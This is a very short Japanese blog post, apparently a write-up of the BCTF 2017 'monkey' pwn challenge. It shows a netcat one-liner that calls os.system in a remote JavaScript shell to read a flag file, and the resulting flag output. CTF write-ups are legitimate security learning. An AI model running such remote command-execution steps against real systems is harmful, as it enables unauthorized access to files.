---
layout: post
alias: "/blog/2017/04/22/bctf-2017-monkey/"
date: "2017-04-22T01:14:11+09:00"
title: "BCTF 2017: monkey"
tags: [ "ctf", "writeup", "bctf", "pwn", "javascript" ]
---

## solution

諸々のファイルが渡されるが、ぐぐると`os.system`があると分かるので終わり。

```
$ echo 'os.system("cat /home/js/flag")' | nc 202.112.51.248 2333
js> os.system("cat /home/js/flag")
bctf{319c1b47f786c7b99a757da74fd38408}
js> 0
```
